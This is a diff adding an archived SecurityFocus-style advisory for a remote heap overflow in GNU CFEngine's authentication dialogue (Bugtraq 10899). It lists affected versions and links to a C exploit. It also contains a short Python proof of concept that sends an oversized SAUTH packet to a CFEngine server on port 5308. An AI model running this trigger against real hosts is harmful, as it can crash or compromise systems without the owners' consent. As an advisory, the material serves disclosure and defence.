@@ -1,0 +1,159 @@
+#SpeeDr00t@Black Falcon<br>#bid10899<p><b><span style="font-size: 18pt;">GNU CFEngine AuthenticationDialogue Remote Heap Based Buffer Overrun Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/10899/info">info</a><br><a href="http://www.securityfocus.com/bid/10899/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/10899/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/10899/solution">solution</a><br><a href="http://www.securityfocus.com/bid/10899/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				10899
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 09 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 09 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to Juan Pablo Martinez Kuhn from
+Core Security Technologies.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					GNU Cfengine 2.1.7 p1<br/>
+					
+				
+					GNU Cfengine 2.1 .0a9<br/>
+					
+				
+					GNU Cfengine 2.1 .0a8<br/>
+					
+				
+					GNU Cfengine 2.1 .0a6<br/>
+					
+				
+					GNU Cfengine 2.0.7 p3<br/>
+					
+				
+					GNU Cfengine 2.0.7 p2<br/>
+					
+				
+					GNU Cfengine 2.0.7 p1<br/>
+					
+				
+					GNU Cfengine 2.0.7 <br/>
+					
+				
+					GNU Cfengine 2.0.6 <br/>
+					
+				
+					GNU Cfengine 2.0.5 pre2<br/>
+					
+				
+					GNU Cfengine 2.0.5 pre<br/>
+					
+				
+					GNU Cfengine 2.0.5 b1<br/>
+					
+				
+					GNU Cfengine 2.0.5 <br/>
+					
+				
+					GNU Cfengine 2.0.4 <br/>
+					
+				
+					GNU Cfengine 2.0.3 <br/>
+					
+				
+					GNU Cfengine 2.0.2 <br/>
+					
+				
+					GNU Cfengine 2.0.1 <br/>
+					
+				
+					GNU Cfengine 2.0 .8p1<br/>
+					
+				
+					GNU Cfengine 2.0 .8<br/>
+					
+				
+					GNU Cfengine 2.0 .0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					GNU Cfengine 2.1.9 <br/>
+					
+				
+					GNU Cfengine 2.1.8 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x11000/10899/cfengine_hof.c">#exploit_cfengine_hof.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit was developed by the discoverers of this vulnerability. This exploit is not believed to be public. The following proof of concept is available:<br/><br/>import struct<br/>import socket<br/>import time<br/><br/>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br/>s.connect(('192.168.1.1',5308)<br/><br/>           # CAUTH command<br/>p = 'k'            # status<br/>p += '0000023'         # len<br/>p += 'CAUTH '         # command<br/>p += 'HARE KRISHNA HARE'<br/>print 'sending CAUTH command...'<br/>s.send(p)<br/>           # SAUTH command<br/>p = 'k'            # status<br/>p += '0003000'        # len<br/>p += 'SAUTH '        # command<br/>p += 'n'        # iscrypt<br/>p += '00000010 '     # crypt_len<br/>p += '00001000'        # nonce_len<br/>p += 'X' * 3000<br/>print 'sending SAUTH command...'<br/>s.send(p)<br/><br/>a = s.recv(4096)<br/>print a<br/><br/>Exploit code cfengine_hof.c has been supplied by jsk exworm &lt;exworm.hostrocket.com&gt;. 
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/cfengine_hof.c">/data/vulnerabilities/exploits/cfengine_hof.c</a></li>
+</ul>
+</div>
